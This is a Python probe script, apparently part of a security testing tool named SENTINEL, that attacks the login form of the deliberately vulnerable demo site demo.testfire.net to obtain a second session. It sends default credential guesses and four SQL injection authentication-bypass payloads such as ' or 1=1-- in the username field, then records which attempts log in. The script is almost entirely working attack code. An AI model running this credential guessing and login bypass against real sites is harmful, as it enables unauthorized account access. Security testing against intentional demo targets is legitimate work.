#!/usr/bin/env python3
"""SENTINEL v2.8.0 — testfire.net second-account probe.

Goal: obtain a SECOND valid session on demo.testfire.net so the
Multi-User Authorization matrix (ENG-AUTHZ) can run for real.

Tries:
  1. admin/admin (documented, previously rejected)
  2. A few other documented demo credential pairs
  3. SQLi authentication-bypass payloads on the login form
     (the app is a deliberately-vulnerable demo; the login SQLi is
     already a SENTINEL-verified class on this target family)

Success marker: "Sign Off" in the landing page body (same semantics
as sentinel/auth.py).
"""
import json
import time
import urllib.request
import urllib.parse
import http.cookiejar

LOGIN_URL = "http://demo.testfire.net/login.jsp"
USER_FIELD = "uid"
PASS_FIELD = "passw"
SUCCESS = "sign off"

ATTEMPTS = [
    # (label, username, password)
    ("admin/admin (retry)", "admin", "admin"),
    ("admin/password", "admin", "password"),
    ("admin/admin1234", "admin", "admin1234"),
    ("jsmith/demo1234 (control)", "jsmith", "demo1234"),
    # SQLi bypass family — login bypass on the uid field
    ("sqli: ' or '1'='1", "' or '1'='1", "x"),
    ("sqli: ' or 1=1--", "' or 1=1--", "x"),
    ("sqli: admin'--", "admin'--", "x"),
    ("sqli: admin' or '1'='1", "admin' or '1'='1", "x"),
]


def attempt(label, user, pw):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        # do NOT auto-follow: login is a redirect on success
    )
    body = urllib.parse.urlencode({USER_FIELD: user, PASS_FIELD: pw}).encode()
    req = urllib.request.Request(LOGIN_URL, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sentinel-probe/2.8.0")
    try:
        with op.open(req, timeout=25) as resp:
            status = resp.status
            text = resp.read(60000).decode("utf-8", "replace")
            loc = resp.headers.get("Location", "")
    except urllib.error.HTTPError as e:
        status = e.code
        text = e.read(60000).decode("utf-8", "replace") if e.fp else ""
        loc = e.headers.get("Location", "") if e.headers else ""
    except Exception as e:
        return {"label": label, "ok": False, "status": 0, "err": f"{type(e).__name__}: {e}"}

    ok = SUCCESS in text.lower()
    # figure out who we are: look for a displayed account name
    who = ""
    for m in ("John Smith", "Admin", "admin"):
        if m in text:
            who = m
            break
    return {
        "label": label,
        "ok": ok,
        "status": status,
        "location": loc,
        "who": who,
        "body_len": len(text),
        "cookies": [c.name for c in cj],
    }


def main():
    results = []
    for label, u, p in ATTEMPTS:
        r = attempt(label, u, p)
        results.append(r)
        print(f"[{'OK ' if r['ok'] else 'FAIL'}] {r['label']:28s} status={r['status']} "
              f"who={r.get('who','')} loc={r.get('location','')} err={r.get('err','')}")
        time.sleep(1.5)  # be gentle with the demo target
    with open("/home/z/my-project/verify-live/results/probe_tf_second_account.json", "w") as f:
        json.dump(results, f, indent=1)
    winners = [r for r in results if r["ok"]]
    print(f"\n=== {len(winners)} successful logins ===")
    for w in winners:
        print("  *", w["label"])


if __name__ == "__main__":
    main()
